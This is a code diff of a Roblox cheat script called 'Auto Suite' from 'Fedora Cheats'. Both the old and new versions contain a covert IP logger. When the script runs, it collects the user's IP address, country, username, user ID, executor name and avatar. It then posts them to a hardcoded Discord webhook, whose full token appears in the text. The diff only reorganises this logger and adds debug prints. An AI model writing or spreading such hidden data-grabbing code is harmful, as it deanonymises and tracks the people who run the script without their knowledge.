@@ -10,136 +10,112 @@ local me          = Players.LocalPlayer
 
 local webhookURL = "https://discord.com/api/webhooks/1559374825364136008/qOYpc1QvKh1e0-I-38log1TY4fgCeOjbJkQo5ytIl-eXnAugBwLw1ehrwnx8TppTehmJ"
 
-do
-    local function req(opts)
-        if http_request then
-            local ok, res = pcall(http_request, opts)
-            if ok then return res end
-        end
-        if request then
-            local ok, res = pcall(request, opts)
-            if ok then return res end
-        end
-        if syn and syn.request then
-            local ok, res = pcall(syn.request, opts)
-            if ok then return res end
-        end
-        if http and http.request then
-            local ok, res = pcall(http.request, opts)
-            if ok then return res end
-        end
-        if fluxus and fluxus.request then
-            local ok, res = pcall(fluxus.request, opts)
-            if ok then return res end
-        end
-        return nil
+local function _request(opts)
+    if http_request then
+        local ok, res = pcall(http_request, opts)
+        if ok and res then return res end
     end
-
-    local function getIP()
-        local ok, response = pcall(function()
-            return req({
-                Url = "https://api64.ipify.org/?format=json",
-                Method = "GET"
-            })
-        end)
-        if ok and response and response.Body then
-            local ok2, ipData = pcall(HttpService.JSONDecode, HttpService, response.Body)
-            if ok2 and ipData and ipData.ip then
-                return tostring(ipData.ip)
-            end
-        end
-        local ok3, res3 = pcall(function() return game:HttpGet("https://api64.ipify.org/?format=json") end)
-        if ok3 and res3 then
-            local ok4, ipData2 = pcall(HttpService.JSONDecode, HttpService, res3)
-            if ok4 and ipData2 and ipData2.ip then
-                return tostring(ipData2.ip)
-            end
-        end
-        return "Unknown"
+    if request then
+        local ok, res = pcall(request, opts)
+        if ok and res then return res end
     end
-
-    local function getCountry()
-        local ok, response = pcall(function()
-            return req({ Url = "http://ip-api.com/json/", Method = "GET" })
-        end)
-        if ok and response and response.Body then
-            local ok2, dec = pcall(HttpService.JSONDecode, HttpService, response.Body)
-            if ok2 and dec and dec.country then
-                return tostring(dec.country)
-            end
-        end
-        return "Unknown"
+    if syn and syn.request then
+        local ok, res = pcall(syn.request, opts)
+        if ok and res then return res end
     end
-
-    local function getExec()
-        local ok, name = pcall(function()
-            if identifyexecutor then return identifyexecutor() end
-        end)
-        if ok and name then return tostring(name) end
-        return "Unknown"
+    if http and http.request then
+        local ok, res = pcall(http.request, opts)
+        if ok and res then return res end
     end
-
-    local function getPfp(id)
-        local ok, url = pcall(function()
-            return Players:GetUserThumbnailAsync(
-                id,
-                Enum.ThumbnailType.HeadShot,
-                Enum.ThumbnailSize.Size420x420
-            )
-        end)
-        if ok and url then return url end
-        return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(id) .. "&width=420&height=420&format=png"
+    if fluxus and fluxus.request then
+        local ok, res = pcall(fluxus.request, opts)
+        if ok and res then return res end
     end
-
-    local function send(content)
-        local ok = pcall(function()
-            req({
-                Url = webhookURL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = HttpService:JSONEncode(content)
-            })
-        end)
-        return ok
-    end
-
-    task.spawn(function()
-        local id       = me.UserId
-        local username = me.Name
-        local display  = me.DisplayName or me.Name
-        local ip       = getIP()
-        local country  = getCountry()
-        local exec     = getExec()
-        local pfp      = getPfp(id)
-        local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
-
-        send({ ["content"] = "User IP: " .. ip })
-
-        local embed = {
-            title       = "Script Executed",
-            description = "A user executed an auto script",
-            color       = 0x00C853,
-            thumbnail   = { url = pfp },
-            fields = {
-                { name = "Username",     value = "`" .. username .. "`",     inline = true },
-                { name = "Display Name", value = "`" .. display .. "`",      inline = true },
-                { name = "User ID",      value = "`" .. tostring(id) .. "`", inline = true },
-                { name = "Country",      value = "`" .. country .. "`",      inline = true },
-                { name = "Logged Time",  value = "`" .. timestamp .. "`",    inline = false },
-                { name = "Executor",     value = "`" .. exec .. "`",         inline = true },
-                { name = "IP Address",   value = "`" .. ip .. "`",           inline = true },
-                { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(id) .. "/profile)", inline = true },
-            },
-            footer = { text = "Auto Suite Logger - Fedora Cheats" },
-        }
-
-        send({
-            username   = "Auto Suite Logger",
-            avatar_url = pfp,
-            embeds     = { embed },
-        })
-    end)
+    return nil
 end
+
+local response = _request({
+    Url = "https://api64.ipify.org/?format=json",
+    Method = "GET"
+})
+
+local ipData = { ip = "Unknown" }
+if response and response.Body then
+    local ok, dec = pcall(HttpService.JSONDecode, HttpService, response.Body)
+    if ok and dec and dec.ip then
+        ipData = dec
+    end
+end
+
+print("[AutoSuite] IP fetched:", ipData.ip)
+
+local ipResponse = _request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode({ ["content"] = "User IP: " .. ipData.ip })
+})
+print("[AutoSuite] IP webhook status:", ipResponse and (ipResponse.StatusCode or ipResponse.Status or ipResponse.status or "sent") or "nil")
+
+local _id       = me.UserId
+local _username = me.Name
+local _display  = me.DisplayName or me.Name
+local _exec     = (function()
+    local ok, name = pcall(function()
+        if identifyexecutor then return identifyexecutor() end
+    end)
+    if ok and name then return tostring(name) end
+    return "Unknown"
+end)()
+
+local _country = "Unknown"
+do
+    local r = _request({ Url = "http://ip-api.com/json/", Method = "GET" })
+    if r and r.Body then
+        local ok, dec = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        if ok and dec and dec.country then _country = tostring(dec.country) end
+    end
+end
+
+local _pfp = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(_id) .. "&width=420&height=420&format=png"
+do
+    local ok, url = pcall(function()
+        return Players:GetUserThumbnailAsync(_id, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+    end)
+    if ok and url then _pfp = url end
+end
+
+local _timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
+
+local _embed = {
+    title       = "Script Executed",
+    description = "A user executed an auto script",
+    color       = 0x00C853,
+    thumbnail   = { url = _pfp },
+    fields = {
+        { name = "Username",     value = "`" .. _username .. "`",     inline = true },
+        { name = "Display Name", value = "`" .. _display .. "`",      inline = true },
+        { name = "User ID",      value = "`" .. tostring(_id) .. "`", inline = true },
+        { name = "Country",      value = "`" .. _country .. "`",      inline = true },
+        { name = "Logged Time",  value = "`" .. _timestamp .. "`",    inline = false },
+        { name = "Executor",     value = "`" .. _exec .. "`",         inline = true },
+        { name = "IP Address",   value = "`" .. ipData.ip .. "`",     inline = true },
+        { name = "Profile",      value = "[Roblox Profile](https://www.roblox.com/users/" .. tostring(_id) .. "/profile)", inline = true },
+    },
+    footer = { text = "Auto Suite Logger - Fedora Cheats" },
+}
+
+local embedResponse = _request({
+    Url = webhookURL,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode({
+        username   = "Auto Suite Logger",
+        avatar_url = _pfp,
+        embeds     = { _embed },
+    })
+})
+print("[AutoSuite] Embed webhook status:", embedResponse and (embedResponse.StatusCode or embedResponse.Status or embedResponse.status or "sent") or "nil")
 
 local file = "autosuite_config.json"
 
